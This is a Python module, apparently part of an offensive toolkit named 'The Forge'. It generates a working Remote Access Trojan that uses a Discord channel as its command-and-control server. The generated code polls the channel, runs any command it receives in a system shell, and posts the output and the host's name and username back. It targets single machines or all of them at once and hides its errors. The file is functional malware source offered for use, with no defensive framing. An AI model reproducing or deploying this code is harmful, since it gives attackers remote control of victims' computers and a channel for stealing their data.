"""
The Forge — Discord C2 RAT
Fileless Python payload that operates over Discord Webhooks & Bot API natively.
"""

import textwrap

def generate_python(bot_token: str = "YOUR_BOT_TOKEN_HERE", channel_id: str = "YOUR_CHANNEL_ID_HERE") -> str:
    """Python-based Discord Remote Access Trojan (Runs asynchronously)."""
    
    code = textwrap.dedent(f"""\
        import os
        import sys
        import time
        import platform
        import threading
        import subprocess
        import urllib.request
        import json

        # Discord C2 Config
        TOKEN = "{bot_token}"
        CHANNEL_ID = "{channel_id}"
        API_BASE = "https://discord.com/api/v10"
        HEADERS = {{"Authorization": f"Bot {{TOKEN}}", "Content-Type": "application/json"}}

        # System Identity (To track multiple bots)
        SYS_ID = platform.node() + "-" + os.environ.get("USERNAME", "System")

        def send_message(content):
            url = f"{{API_BASE}}/channels/{{CHANNEL_ID}}/messages"
            payload = {{"content": f"**[{{SYS_ID}}]**\\n```\\n{{content}}\\n```"}}
            req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers=HEADERS)
            try:
                urllib.request.urlopen(req)
            except Exception:
                pass

        def get_commands(last_msg_id):
            url = f"{{API_BASE}}/channels/{{CHANNEL_ID}}/messages?limit=5"
            if last_msg_id:
                url += f"&after={{last_msg_id}}"
            
            req = urllib.request.Request(url, headers=HEADERS)
            try:
                res = urllib.request.urlopen(req)
                return json.loads(res.read())
            except Exception:
                return []

        def execute_cmd(cmd):
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
                return output.decode(errors="ignore")
            except subprocess.TimeoutExpired:
                return "[!] Command timed out."
            except subprocess.CalledProcessError as e:
                return e.output.decode(errors="ignore")
            except Exception as e:
                return str(e)

        def c2_loop():
            send_message(f"[+] RAT Initialized. Shell ready. Type '!{{SYS_ID}} <command>' to execute.")
            last_msg_id = None
            
            while True:
                try:
                    msgs = get_commands(last_msg_id)
                    for msg in reversed(msgs):
                        last_msg_id = msg['id']
                        content = msg.get('content', '')
                        
                        # Only execute commands directed to this specific machine ID or '!all'
                        if content.startswith(f"!{{SYS_ID}} ") or content.startswith("!all "):
                            cmd = content.split(" ", 1)[1]
                            
                            # Handle specific built-in RAT commands
                            if cmd == "sysinfo":
                                result = f"OS: {{platform.system()}} {{platform.version()}}\\nUser: {{os.environ.get('USERNAME')}}"
                            elif cmd == "exit":
                                send_message("[*] Process terminating.")
                                sys.exit(0)
                            else:
                                result = execute_cmd(cmd)
                            
                            if result.strip():
                                # Handle Discord max length 2000 chars limit chunks
                                chunk_size = 1900
                                chunks = [result[i:i+chunk_size] for i in range(0, len(result), chunk_size)]
                                for c in chunks:
                                    send_message(c)
                except Exception:
                    pass
                time.sleep(5)  # Polling interval to avoid rate limits

        if __name__ == "__main__":
            # Run in daemon thread to hide console locking
            t = threading.Thread(target=c2_loop, daemon=True)
            t.start()
            t.join()
    """)
    return code

VARIANTS = {
    "python": generate_python,
}

def generate(language: str = "python", **kwargs) -> str:
    return VARIANTS[language](**kwargs)

def list_variants() -> list[str]:
    return list(VARIANTS.keys())
